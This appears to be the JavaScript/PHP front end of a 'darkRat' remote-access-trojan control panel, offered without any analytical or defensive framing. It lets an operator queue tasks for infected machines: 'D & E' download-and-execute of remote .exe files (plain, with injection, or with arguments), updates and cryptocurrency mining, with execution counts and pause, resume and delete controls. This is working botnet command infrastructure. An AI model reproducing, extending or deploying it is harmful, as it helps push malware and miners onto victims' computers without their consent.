<script>

  $('#tasksSelect').change(function(){
    console.log($(this).val());
    var tasksettings = $("#tasksettings");
    tasksettings.empty();
    var showex = true;
    switch ($(this).val()) {
        case "0":
            showex = false;
            tasksettings.append(' <div class="form-group"> <label> No Task Selected to Display </label> </div>');
            break;
        case "1":
            tasksettings.append(' <div class="form-group"> <label> Parameters </label><input class="form-control" type="text" name="params" placeholder="Ex: http://site.com/file.exe"/> </div>');
            break;
        case "2":
            tasksettings.append(' <div class="form-group"> <label> Parameters </label><input class="form-control" type="text" name="params" placeholder="Ex: http://site.com/file.exe"/> </div>');
            break;
        case "3":
            tasksettings.append(' <div class="form-group"> <label> Parameters </label><input class="form-control" type="text" name="params" placeholder="Ex: http://site.com/file.exe~-a MyArgument -b MyAgrument"/> </div>');
            break;
        case "9":
            tasksettings.append(' <div class="form-group"> <label> Parameters </label><input class="form-control" type="text" name="params" placeholder="Ex: http://site.com/update.exe"/> </div>');
            break;

    }
    if(showex == true){
        tasksettings.append(' <div class="form-group"> <label> Number of Executions </label><input class="form-control" type="text" name="execs" placeholder="Leave blank for unlimited"/> </div>');
        tasksettings.append(' <div class="form-group">     <button id="submitdarkRatTask" type="button" class="btn btn-default">Create Task</button>     </div>');
    }
  });






  $(document).on('click', '#submitdarkRatTask', function () {
    var id = $(this).attr('id');
	var form_data = $("#createTask").serialize(); //Encode form elements for submission
	$.ajax({
		url : "<?php echo $APIURL;?>?edit=tasks&username=<?php echo $USERNAME;?>",
        type: "POST",
        dataType: "json",
		data : form_data,
	}).done(function(response){ //
        console.log(response);
        toastr.success('Settings Updated!', response.message);
        gettasks();
	}).fail(function(response){
        toastr.warning('Fuck We have a Error!');
    });
});
function Base64Encode(str, encoding = 'utf-8') {
    var bytes = new (TextEncoder || TextEncoderLite)(encoding).encode(str);        
    return base64js.fromByteArray(bytes);
}

function Base64Decode(str, encoding = 'utf-8') {
    var bytes = base64js.toByteArray(str);
    return new (TextDecoder || TextDecoderLite)(encoding).decode(bytes);
}
function truncateString(str, length) {
     return str.length > length ? str.substring(0, length - 3) + '...' : str
}
function getTaskById(id){
    switch (id) {
        case "1":
                return "D & E";
            break;
        case "2":
                return "D & E (Inject)";
            break;
        case "3":
                return "D & E (Arguments)";
            break;
        case "11":
                return "Mining";
            break;
    }
}

function TaskPause(id){

    $.post('<?php echo $APIURL;?>?edit=pause&username=<?php echo $USERNAME;?>',  { 'id': id }, function(data) {
        toastr.success('Pause Success!');
        gettasks();
    });
}
function TaskResume(id){

    $.post('<?php echo $APIURL;?>?edit=resume&username=<?php echo $USERNAME;?>',  { 'id': id }, function(data) {
        toastr.success('Resume Success!');
        gettasks();
    });
}
function TaskDelete(id){

    $.post('<?php echo $APIURL;?>?edit=delete&username=<?php echo $USERNAME;?>',  { 'id': id }, function(data) {
        toastr.success('Delete Success!');
        gettasks();
    });
}

function gettasks(){
    $("#currentTasks table tbody").empty();
        var returnItems = [];
        $.post('<?php echo $APIURL;?>?get=tasks', function(data) {
           // console.log(data.records);
                $.each( data.records, function( key, value ) {
                  //  element.append("<div class='form-group'>" + Base64Decode(value.params.trim()) + '  </div>');
                  var tempclass ="";
                  var actionbutton ="";
                  if(value.status == 1){
                    tempclass="green";
                  }else{
                    tempclass="red";
                  }

                if(value.status == 1){
                    actionbutton = '<i onclick="TaskPause('+value.id+')" class="fa fa-pause"></i>   ';
                }else{
                    actionbutton = ' <i onclick="TaskResume('+value.id+')" class="fa fa-play" aria-hidden="true"></i> ';
                }
                deletebutton = '&#160;&#160;&#160;&#160;<i onclick="TaskDelete('+value.id+')" class="fa fa-trash" aria-hidden="true"></i>';

                  $("#currentTasksData").append(' <tr class="'+tempclass+'"> <th scope="row">'+value.id.trim()+'</th> <td>'+getTaskById(value.task)+'</td> <td>'+ truncateString(Base64Decode(value.params.trim()),50) +'</td> <td> '+value.executed+'/'+value.executions+'</td><td>'+actionbutton+deletebutton+' </td> </tr> ');
                });
              
        });
        return returnItems;
}


$(function () {
    element =  $("#currentTasks");
    element.append('<table class="table table-dark"> <thead> <tr> <th scope="col">#</th> <th scope="col">Task</th> <th scope="col">Task Param</th> <th scope="col">Executions</th> <th>Action</th></tr> </thead> <tbody id="currentTasksData">' +gettasks()+ '</tbody> </table>');



});

</script>